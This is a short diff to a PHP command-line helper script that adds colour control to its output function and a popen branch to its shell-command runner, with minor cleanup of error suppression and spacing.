@@ -1,10 +1,10 @@
 <?php
-	function echon($str,$debug=false){
+	function echon($str,$debug=false,$color=34){
 		if($debug){
 			//slient when the message is debug output
 			//echo $str."\n";
 		}else{
-			echo chr(27)."[0;34m".$str.chr(27)."[m\n";
+			echo chr(27)."[0;".$color."m".$str.chr(27)."[m\n";
 		}
 	}
 	function getline(){
@@ -44,7 +44,14 @@
 				die();
 		}
 	}
-	function cmd($cfe) {
+	function cmd($cfe,$ispopen=false) {
+		if($ispopen){
+			$handle=popen($cfe,'r');
+			$read=fread($handle,4096);
+			echo $read;
+			pclose($handle);
+			return;
+		}
 		$res = '';
 		echon($cfe,1);
 		$cfe = $cfe;
@@ -64,10 +71,10 @@
 				@passthru($cfe);
 				$res = @ob_get_contents();
 				@ob_end_clean();
-			} elseif(@is_resource($f = @popen($cfe,"r"))) {
+			} elseif(is_resource($f = popen($cfe,"r"))) {
 				$res = '';
 				while(!@feof($f)) {
-					$res .= @fread($f,1024); 
+					$res.=@fread($f,1024);
 				}
 				@pclose($f);
 			}
